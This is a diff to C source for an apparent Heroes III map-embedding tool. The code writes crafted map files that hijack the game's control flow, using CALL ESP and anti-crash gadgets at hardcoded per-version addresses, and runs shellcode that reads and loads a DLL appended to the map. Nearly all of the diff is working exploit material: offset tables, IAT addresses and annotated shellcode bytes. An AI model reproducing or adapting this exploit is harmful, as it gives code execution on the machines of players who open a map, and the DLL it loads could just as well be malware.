@@ -16,21 +16,34 @@
 
 #pragma pack(push, 1)
 
-// Minimum essential offsets required to achieve shellcode execution
+// Minimum essential offsets required to achieve shellcode execution.
+// anticrash_gadget2 is accessed before anticrash_gadget1. Both are accesssed
+// before the RETN which returns to call_esp_gadget, and are needed to not
+// crash when using CALL ESP as the control transfer to shellcode.
 struct offsets_t {
+    // call_esp_gadget: Used to call ESP, starting shellcode execution
     uint32_t call_esp_gadget;
-    uint32_t anticrash_gadget1;
+    // anticrash_gadget1: Has to pass through the following without taking the jump:
+    // MOV EAX, DWORD PTR DS : [ECX]
+    // CALL DWORD PTR DS : [EAX+4]
+    // CMP EAX, 6
+    // JAE SHORT 00503F88
+    uint32_t anticrash_gadget1; 
+    // anticrash_gadget2: Has to go through the following without jumping:
+    // MOV EAX, DWORD PTR DS : [ECX]
+    // CALL DWORD PTR DS : [EAX+4]
+    // CMP EAX, 6
+    // JAE SHORT 00503F88
     uint32_t anticrash_gadget2;
-    uint8_t pad_end;
 };
 
 static const struct offsets_t * const TARGET_OFFSETS[] = {
     // Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE
-    (struct offsets_t *)"\x87\xFF\x4E\x00\xD4\x97\x44\x00\x30\x64\x6A\x00\x80",
+    (struct offsets_t *)"\x87\xFF\x4E\x00\xD4\x97\x44\x00\x30\x64\x6A\x00",
     // Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280
-    (struct offsets_t *)"\x0F\x0C\x58\x00\x48\x6A\x45\x00\x30\x68\x6A\x00\x80",
+    (struct offsets_t *)"\x0F\x0C\x58\x00\x48\x6A\x45\x00\x30\x68\x6A\x00",
     // h3demo.exe 522B6F45F534058D02A561838559B1F4
-    (struct offsets_t *)"\xB1\xEA\x43\x00\x0F\x0C\x58\x00\x00\xCE\x5C\x00\x74"
+    (struct offsets_t *)"\xB1\xEA\x43\x00\x0F\x0C\x58\x00\x00\xCE\x5C\x00"
 };
 
 // Original return that gets overwritten, used to return without crash
@@ -38,9 +51,9 @@ static const uint32_t TARGET_RETNS[] = {
     // Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE
     0x005045C1,
     // Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280
-    0x00504C11,
+    0x00504C11
     // h3demo.exe 522B6F45F534058D02A561838559B1F4
-    0x12345678 // TODO retrieve
+    // TODO retrieve
 };
 
 // Import Address Table values needed for loading DLL without crash
@@ -65,7 +78,7 @@ struct iat_t {
 };
 
 static const struct iat_t * const TARGET_IATS[] = {
-// Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE
+    // Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE
     // SetCurrentDirectoryA, CreateFileA, VirtualAlloc
     (struct iat_t *)"\x04\xA2\x63\x00\x04\xA1\x63\x00\x48\xA1\x63\x00"
     // ReadFile, WriteFile
@@ -76,7 +89,7 @@ static const struct iat_t * const TARGET_IATS[] = {
     "\xC4\xA0\x63\x00\xFC\xA1\x63\x00"
     // ExitProcess
     "\xC0\xA1\x63\x00",
-// Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280
+    // Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280
     // SetCurrentDirectoryA, CreateFileA, VirtualAlloc
     (struct iat_t *)"\x04\xA2\x63\x00\x08\xA1\x63\x00\x48\xA1\x63\x00"
     // ReadFile, WriteFile
@@ -87,20 +100,42 @@ static const struct iat_t * const TARGET_IATS[] = {
     "\xC8\xA0\x63\x00\xFC\xA1\x63\x00"
     // ExitProcess
     "\xC0\xA1\x63\x00"
+    // h3demo.exe 522B6F45F534058D02A561838559B1F4
+    // TODO retrieve
+};
+
+struct stack_offsets_t {
+    uint32_t maps_stack_offset;
+    uint32_t filename_stack_offset;
+};
+
+static const struct stack_offsets_t * const STACK_OFFSETS[] = {
+    // Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE
+    // maps_stack_offset 0x26C, filename_stack_offset 0x288 
+    (struct stack_offsets_t *)"\x6C\x02\x00\x00\x88\x02\x00\x00",
+    // Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280
+    // maps_stack_offset 0x26C, filename_stack_offset 0x288 
+    (struct stack_offsets_t *)"\x8C\x02\x00\x00\xA8\x02\x00\x00"
+    // h3demo.exe 522B6F45F534058D02A561838559B1F4
+    // TODO retrieve
 };
 
 struct shellcode_oa_jmp_to_dll_load_t {
-    uint8_t c1_1[18];
+    uint8_t c1_1[11];
+    uint32_t maps_stack_offset;
+    uint8_t c1_2[3];
     uint32_t SetCurrentDirectoryA;
-    uint8_t c1_2[25];
+    uint8_t c1_3[18];
+    uint32_t filename_stack_offset;
+    uint8_t c1_4[3];
     uint32_t CreateFileA;
-    uint8_t c1_3[10];
+    uint8_t c1_5[10];
     uint32_t total_file_size;
-    uint8_t c1_4[5];
+    uint8_t c1_6[5];
     uint32_t VirtualAlloc;
-    uint8_t c1_5[2];
+    uint8_t c1_7[2];
     uint32_t shellcode_eof_offset;
-    uint8_t c1_6[2];
+    uint8_t c1_8[2];
     uint32_t ReadFile;
     uint8_t c2[35]; // includes c3, j2 up to ss
     uint32_t call_esp_gadget;
@@ -109,11 +144,12 @@ struct shellcode_oa_jmp_to_dll_load_t {
     uint8_t j1[2];
 };
 
+// This shellcode is put inside the OA section and jmps to DLL LOAD at EOF
 static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0xCC, 0xCC, 0xCC,                           // UNUSED
 /*c1:*/ 0x8D, 0x64, 0xE4, 0x80,                     // LEA ESP, [ESP - 80]
         0x60,                                       // PUSHAD
-        0x8B, 0x84, 0xE4, 0x6C, 0x02, 0x00, 0x00,   // MOV EAX, DWORD PTR SS : [ESP + 26C]
+        0x8B, 0x84, 0xE4, 0x12, 0x34, 0x56, 0x78,   // MOV EAX, DWORD PTR SS : [ESP + 0x12345678] ; str "", relative pos on stack
         0x50,                                       // PUSH EAX
         0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.SetCurrentDirectoryA>]
         0x6A, 0x00,                                 // PUSH 0
@@ -122,7 +158,7 @@ static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0x6A, 0x00,                                 // PUSH 0
         0x6A, 0x03,                                 // PUSH 3
         0x68, 0x00, 0x00, 0x00, 0x80,               // PUSH 80000000
-        0x8B, 0x84, 0xE4, 0x88, 0x02, 0x00, 0x00,   // MOV EAX, DWORD PTR SS : [ESP + 288]
+        0x8B, 0x84, 0xE4, 0x12, 0x34, 0x56, 0x78,   // MOV EAX, DWORD PTR SS : [ESP + 0x12345678] ; str "<map name>", relative pos on stack
         0x50,                                       // PUSH EAX
         0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
         0x89, 0xC3,                                 // MOV EBX, EAX
@@ -148,10 +184,10 @@ static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,   // ; GARBAGE, game trashes these bytes
 /*j2:*/ 0xEB, 0x8B,                                 // JS c1 <-0x72> ; j2, jumps to c1
         0xCC,                                       // UNUSED
-/*ss:*/ 0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; CALL [ESP]-gadget
+/*ss:*/ 0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; CALL ESP-gadget
         0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; anticrash_gadget1
-        0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; anticrash_gadget1
-/*j1:*/ 0xEB, 0xEF                                  // JS j2 <-0x0F>  ; j1, jumps to j2
+        0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; anticrash_gadget2
+/*j1:*/ 0xEB, 0xEF                                  // JS j2 <-0x0F> ; j1, jumps to j2
 };
 
 struct shellcode_eof_load_dll_t {
@@ -183,6 +219,7 @@ struct shellcode_eof_load_dll_t {
     uint8_t dll[];
 };
 
+// This shellcode is at the EOF
 static const uint8_t SHELLCODE_EOF_LOAD_DLL[] = {
 /*c1:*/ 0x53,                                       // PUSH EBX
     0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.CloseHandle>]
@@ -192,7 +229,7 @@ static const uint8_t SHELLCODE_EOF_LOAD_DLL[] = {
     0x6A, 0x00,                                     // PUSH 0
     0x6A, 0x03,                                     // PUSH 3
     0x68, 0x00, 0x00, 0x00, 0x40,                   // PUSH 40000000
-    0x8D, 0xB5, 0xA5, 0x00, 0x00, 0x00,             // LEA ESI, [EBP + 0A5]
+    0x8D, 0xB5, 0xA5, 0x00, 0x00, 0x00,             // LEA ESI, [EBP + 0A5] ; str "h3m_code.dll", from below
     0x56,                                           // PUSH ESI
     0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
     0x89, 0xC3,                                     // MOV EBX, EAX
@@ -228,6 +265,9 @@ static const uint8_t SHELLCODE_EOF_LOAD_DLL[] = {
     0x53,                                           // PUSH EBX
     0xFF, 0xD0,                                     // CALL EAX
     0xC7, 0x03, 0xC2, 0x10, 0x00, 0x00,             // MOV DWORD PTR DS : [EBX], 10C2
+
+    // TODO: Patch away 00504910 for HD mod here
+
     0x61,                                           // POPAD
     0x81, 0xC4, 0x80, 0x00, 0x00, 0x00,             // ADD ESP, 80
     0x8D, 0xAC, 0xE4, 0x8C, 0x00, 0x00, 0x00,       // LEA EBP, [ESP + 8C]
@@ -245,6 +285,9 @@ static const uint8_t SHELLCODE_EOF_LOAD_DLL[] = {
     0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x00    // "VirtualProtect"
 };
 
+// Data that makes the map editor satisfied by being a valid OA body, 
+// while it also makes the game itself satisfied by being a valid start of
+// OD section
 static const uint8_t MAPED_VALIDATION[] = {
     0x12, 0x34, 0x56, 0x78, 0x04, 0x06, 0x00, 0x12, 0x34, 0x56, 0x78, 0x00, 0x00, 0x00, 
     0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x68, 0x33, 0x6D, 0x6C, 0x69, 0x62, 0x20, 0x62,
@@ -270,6 +313,7 @@ int h3m_modembed_write_oa_eof_jmp(struct H3M_MODEMBED *hm, uint32_t oa_count, ui
 
     const struct offsets_t *const ofs = TARGET_OFFSETS[hm->target];
     const struct iat_t *const iat = TARGET_IATS[hm->target];
+    const struct stack_offsets_t *const sofs = STACK_OFFSETS[hm->target];
 
     // Write an OA entry for sign object, to use it to make map valid in both map editor and game
     def_size = sizeof(SIGN_DEF)-1;
@@ -292,13 +336,18 @@ int h3m_modembed_write_oa_eof_jmp(struct H3M_MODEMBED *hm, uint32_t oa_count, ui
     shellcode_oa = malloc(sizeof(*shellcode_oa));
     memcpy(shellcode_oa, SHELLCODE_OA_JMP_TO_DLL_LOAD,
         sizeof(SHELLCODE_OA_JMP_TO_DLL_LOAD));
+    // IAT
     shellcode_oa->CreateFileA = iat->CreateFileA;
     shellcode_oa->ReadFile = iat->ReadFile;
     shellcode_oa->SetCurrentDirectoryA = iat->SetCurrentDirectoryA;
     shellcode_oa->VirtualAlloc = iat->VirtualAlloc;
+    // Control transfer to shellcode
     shellcode_oa->call_esp_gadget = ofs->call_esp_gadget;
     shellcode_oa->anticrash_gadget1 = ofs->anticrash_gadget1;
     shellcode_oa->anticrash_gadget2 = ofs->anticrash_gadget2;
+    // Stack offsets to strings on stack
+    shellcode_oa->filename_stack_offset = sofs->filename_stack_offset;
+    shellcode_oa->maps_stack_offset = sofs->maps_stack_offset;
     fwrite(shellcode_oa, 1, sizeof(*shellcode_oa), f);
 
     // For the OA body, put data that makes map editor satisfied by being a valid OA body, while it makes the game
